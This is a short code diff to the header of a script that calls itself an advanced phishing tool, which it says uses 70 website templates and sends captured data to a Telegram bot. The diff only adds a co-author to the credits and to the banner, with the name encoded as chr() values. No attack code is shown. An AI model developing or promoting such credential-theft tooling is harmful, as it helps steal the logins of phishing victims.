@@ -3,7 +3,7 @@
 """
 PhishArk - Advanced Phishing Tool
 ---------------------------------
-Author       : Arpit Dhameliya
+Author       : Arpit Dhameliya, Zeel Patel
 Version      : 1.2.1
 License      : MIT
 Description  : Advanced phishing tool supporting 70 website templates and sends data to Telegram Bot
@@ -90,7 +90,7 @@ LOGO = rf"""
  |  __/| | | | \__ \ | | |/ ___ \| |  |   <  
  |_|   |_| |_|_|___/_| |_/_/   \_\_|  |_|\_\\
        {" "*20}       {Colors.CYAN}[v1.2.1]
-   {" "*30}      {Colors.RED}[By {chr(0x41)}{chr(0x72)}{chr(0x70)}{chr(0x69)}{chr(0x74)}{chr(0x78)}{chr(0x64)}]
+   {" "*30}      {Colors.RED}[By {chr(0x41)}{chr(0x72)}{chr(0x70)}{chr(0x69)}{chr(0x74)}{chr(0x78)}{chr(0x64)} & {chr(0x5A)}{chr(0x65)}{chr(0x65)}{chr(0x6C)}]
 {Colors.NC}
 """
 
